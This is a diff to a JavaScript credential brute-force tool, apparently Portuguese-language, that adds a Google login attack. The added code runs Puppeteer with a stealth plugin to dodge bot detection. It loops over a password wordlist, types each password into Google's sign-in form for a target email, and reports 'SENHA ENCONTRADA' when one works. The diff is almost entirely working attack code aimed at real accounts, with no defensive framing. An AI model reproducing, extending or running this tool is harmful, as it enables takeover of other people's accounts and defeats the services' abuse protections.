@@ -1,9 +1,12 @@
 const axios = require("axios");
-const puppeteer = require("puppeteer");
+const puppeteer = require("puppeteer-extra");
+const StealthPlugin = require("puppeteer-extra-plugin-stealth");
 const { ArgumentParser } = require("argparse");
 const fs = require("fs");
 //require('dotenv').config({ path: 'config.env' })
 require("colors");
+
+puppeteer.use(StealthPlugin());
 
 const parser = new ArgumentParser({
   description: "parameters example"
@@ -67,12 +70,51 @@ class brute {
       case "pinterest":
         config = dataParse.pinterest;
         break;
+      case "google":
+        config = dataParse.google;
+        break;
     }
     return config;
   }
 
   attackGoogle() {
-    //pass
+    let config = new brute(site=argSite).loadConfig();
+    this.testFile();
+    let data = fs.readFileSync(this.passwordFile, { encoding: "utf-8" });
+    console.log(`COMEÇANDO O ATAQUE NO GOOGLE`.bold.green);
+    (async () => {
+      let browser = await puppeteer.launch({
+        args: ['--no-sandbox'],
+        headless: false,
+      });
+      let page = await browser.newPage();
+      await page.setUserAgent("Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0");
+      await page.setExtraHTTPHeaders({
+        'accept-language': 'en-US,en;q=0.9,hy;q=0.8'
+      });
+      await page.setViewport({
+        width: 1006,
+        height: 550
+      });
+      for(let password of data.split(/\r?\n/)) {
+        await page.goto(config.url);
+        await page.type(config.inputEmail, this.email);
+        await page.click(config.buttonSubmit);
+        //await page.waitForNavigation(); 
+        await page.type(config.inputPassword, password);
+        await page.click(config.buttonSubmit);
+        await page.waitForNavigation();
+        let urlPage = page.url();
+        let pageContent = await page.content();
+        if(urlPage == config.url || pageContent.indexOf(config.msgError) != -1) {
+          console.log(`[-] SENHA ERRADA: ${password}`.red);
+          await page.goBack();
+        } else {
+          console.log(`\n[+] SENHA ENCONTRADA: ${password}\n`.bold.green);
+          break;
+        }
+      }
+    })();
   }
 
   attack() {
@@ -82,6 +124,7 @@ class brute {
     console.log(`COMEÇANDO O ATAQUE EM ${this.site}\n`.bold.green);
     (async () => {
       let browser = await puppeteer.launch({
+        args: ['--no-sandbox'],
         headless: false,
       });
       let page = await browser.newPage();
@@ -98,6 +141,7 @@ class brute {
         await page.waitForNavigation();
         let urlPage = page.url();
         let pageContent = await page.content();
+        console.log(pageContent);
         if(urlPage == config.url || pageContent.indexOf(config.msgError) != -1) {
           console.log(`[-] SENHA ERRADA: ${password}`.red);
           await page.goBack();
@@ -111,4 +155,8 @@ class brute {
 }
 
 var test = new brute().test();
-var result = new brute(site=argSite, email=argEmail, passwordFile=argPassword).attack();
+if(argSite == "google") {
+  var result = new brute(site=argSite, email=argEmail, passwordFile=argPassword).attackGoogle();
+} else {
+  var result = new brute(site=argSite, email=argEmail, passwordFile=argPassword).attack();
+}
